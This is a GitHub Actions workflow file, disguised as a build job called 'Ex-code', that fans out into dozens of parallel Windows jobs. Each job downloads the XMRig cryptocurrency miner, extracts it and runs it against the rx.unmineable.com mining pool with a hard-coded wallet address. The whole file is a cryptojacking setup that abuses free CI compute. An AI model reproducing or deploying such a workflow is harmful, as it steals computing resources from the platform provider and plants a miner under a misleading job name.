name: Ex_code-unmineable
 
on: [workflow_dispatch]
 
jobs:
  build:
    name: Ex-code
    runs-on: windows-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1.0, 1.1, 1.2, 1.3, 1,35]
        flag: [A, B, C, D, E, F, G, H, I]
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: DOWNLOAD
      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.11.1/xmrig-6.11.1-msvc-win64.zip -OutFile xmrig-6.11.1-msvc-win64.zip
    - name: Extract
      run: Expand-Archive xmrig-6.11.1-msvc-win64.zip
    - name: RUNNING
      run: .\xmrig-6.11.1-msvc-win64\xmrig-6.11.11\xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u btt:=TPqYCm7VDkKdyhWGdPyvi8tVysHXcFMS4c.test -p x -t 1
    - name: DONE
      run: exit
